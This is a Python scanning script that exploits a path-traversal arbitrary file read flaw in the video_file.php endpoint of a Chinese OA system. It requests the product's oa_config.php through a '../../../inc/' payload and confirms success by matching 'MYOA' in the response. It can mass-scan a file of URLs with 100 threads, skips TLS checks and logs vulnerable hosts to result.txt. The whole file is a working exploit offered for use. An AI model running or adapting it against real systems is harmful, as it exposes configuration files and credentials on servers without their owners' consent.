import requests,argparse,sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()



def banner():
    banner = """
██╗   ██╗██╗██████╗ ███████╗ ██████╗         ███████╗██╗██╗     ███████╗
██║   ██║██║██╔══██╗██╔════╝██╔═══██╗        ██╔════╝██║██║     ██╔════╝
██║   ██║██║██║  ██║█████╗  ██║   ██║        █████╗  ██║██║     █████╗  
╚██╗ ██╔╝██║██║  ██║██╔══╝  ██║   ██║        ██╔══╝  ██║██║     ██╔══╝  
 ╚████╔╝ ██║██████╔╝███████╗╚██████╔╝███████╗██║     ██║███████╗███████╗
  ╚═══╝  ╚═╝╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝ 
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='极限OA video_file.php 任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))

        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
    url = target+payload
    headers = {
        "Cache-Control":"max-age=0",
        "Upgrade-Insecure-Requests":"1",
        "Connection":"close",
    }

    try:
        re = requests.get(url=url,headers=headers,verify=False,timeout=5)
        if re.status_code == 200 and 'MYOA' in re.text:
            print( f"[+] {target} 存在任意文件读取漏洞！")
            with open('result.txt',mode='a',encoding='utf-8')as ft:
                ft.write(target+'\n')
        else:
            print(f'[-]该{target}不存在任意文件读取漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()